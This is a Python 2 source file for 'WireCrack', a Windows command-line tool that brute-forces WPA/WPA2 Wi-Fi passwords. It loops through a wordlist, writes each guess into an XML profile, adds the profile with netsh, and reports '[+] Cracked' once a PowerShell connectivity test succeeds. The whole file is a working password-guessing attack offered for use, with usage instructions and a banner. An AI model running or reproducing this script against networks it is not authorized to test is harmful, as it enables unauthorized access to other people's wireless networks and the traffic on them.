''' Wireless Bruteforce Tool '''

'''
	@Author : Dainel Victor Freire Feitosa
	@Version : 2.0
	
	Twitter : @DanielFreire00
	YouTube : ProxySec

	[Disclaimer]
		  Essa ferramenta eh unicamente funcional no windows a partir do 7
		ela trabalha com o comando netsh do prompt que faz as conexoes com as redes wireless
		e tambem com um modulo da powershell para testar a conexao, ele eh uma alternativa
		a programas como airodump que so funcionam perfeitamente no linux/mac, pois o windows
		nao tem muita compatibilidade com modos da placa de rede, essa ferramenta nao precisa
		capturar um handshake somente tenta se autenticar com um XML
	[/Disclaimer]
'''

from os import popen, _exit
from threading import Thread
from re import search
from sys import argv
from platform import system

class WireCrack:

	def __init__(self, ssid, wordlist, auth, config_file='wirecrack-config.xml'):
		self.ssid = ssid
		self.wordlist = wordlist
		self.auth = auth
		self.connection_mode = 'auto'
		self.config_file = config_file

	''' Auto-explicativo '''
	def banner(self):
		banner_b  = ''
		banner_b += '\n _    _ _          _____                _    \n'
		banner_b += '| |  | (_)        /  __ \              | |   \n'
		banner_b += '| |  | |_ _ __ ___| /  \/_ __ __ _  ___| | __\n'
		banner_b += "| |/\| | | '__/ _ \ |   | '__/ _` |/ __| |/ /\n"
		banner_b += '\  /\  / | | |  __/ \__/\ | | (_| | (__|   < \n'
		banner_b += ' \/  \/|_|_|  \___|\____/_|  \__,_|\___|_|\_\\\n\n'

		return banner_b                                  

	''' Verifica se o OS eh Windows '''
	def validateOS(self):
		if system() == 'Windows':
			return True
		else:
			return False

	''' Verifica se a rede que vai ser testada esta a alcance '''
	def checkSSID(self):
		cmd = popen('netsh wlan show networks').read()
		if search(self.ssid, cmd):
			return True
		else:
			return False

	''' Verifica o status de conexao '''
	def checkStatus(self):
		cmd = popen('powershell Test-Connection www.google.com -quiet').read()
		if search('True', cmd):
			return True
		else:
			return False

	''' Informacoes do bruteforce '''
	def getInfo(self):
		print self.banner()
		info =  ''
		info += 'SSID Name  ...........: {ssid}\n'
		info += 'Connection mode ......: {connection_mode}\n'
		info += 'Authentication  ......: {auth}\n\n'

		print info.format(ssid=self.ssid, connection_mode=self.connection_mode, auth=self.auth)

	''' Cria o XML que vai ser autenticado '''
	def generateXML(self, passwd):
		name_xml = self.ssid+'-conn.xml'
		try:
			file = open(self.config_file, 'r')
		except IOError:
			print "ERROR: Can't open %s this file is needed\n"%(self.config_file)
			_exit(0)
		ssid_file = open(name_xml, 'w')
		
		replaced = file.read().replace('SSID_WIFI', self.ssid).replace('HEX_SSID', self.ssid.encode('hex')).replace('PASSWD', passwd)
		
		if self.auth == 'WPA2PSK':
			ssid_file.write(replaced.replace('AUTH', self.auth))
		elif self.auth == 'WPAPSK':
			ssid_file.write(replaced.replace('AUTH', self.auth))
		else:
			print "Authentication don't suported !"
			_exit(0)

		
		file.close()
		ssid_file.close()

		return name_xml

	''' Tenta a conexao com a rede wireless '''
	def connect(self, wordlist):
		for passwd in wordlist:
			xml = self.generateXML(passwd)

			cmd = popen('netsh wlan add profile filename="{xml}"'.format(xml=xml))
			checkStatus = self.checkStatus()

			if checkStatus == True:
				print "\n[+] Cracked => " + passwd + "\n"
				_exit(0)
			else:
				print "[-] Attemp => " + passwd

	''' Executa a thread que roda o programa, uma thread e recomendada pois sao execs IO '''
	def run(self):
		file = open(self.wordlist, 'r').read().split("\n")
		t = Thread(target=self.connect, args=(file,))
		t.start()
		t.join()


index = 1

if len(argv) == 1:
	print 'python %s -h to help'%(argv[0])
	_exit(0)

for arg in argv:
	if arg == '--ssid' or arg == '-S':
		ssid = argv[index+1]
		index += 2
	elif arg == '--wordlist' or arg == '-W':
		wordlist = argv[index+1]
		index += 2
	elif arg == '--auth' or arg == '-A':
		auth = argv[index+1].upper()
		if auth == 'WPA':
			auth = 'WPAPSK'
		elif auth == 'WPA2':
			auth = 'WPA2PSK'
		index += 2
	elif arg == '--help' or arg == '-h':
		print '\nUsage: python %s -S Wifi_Test -W wordlist.lst -A wpa2'%(argv[0])
		print 'Options: \n'
		print '      --ssid/-S      : Wireless network name'
		print '      --wordlist/-W  : Wordlist name'
		print '      --auth/-A      : Authentication type only (wpa2/wpa)\n'
		_exit(0)

try:
	wirecrack = WireCrack(ssid, wordlist, auth)
except NameError:
	print 'python %s -h to help'%(argv[0])
	_exit(0)

validateOS = wirecrack.validateOS()

if validateOS == False:
	print '\nERROR: Only windows support this tool :(\n'
	_exit(0)

if wirecrack.checkSSID() == True:

	wirecrack.getInfo()
	
	try:
		wirecrack.run()
	except KeyboardInterrupt:
		_exit(0)
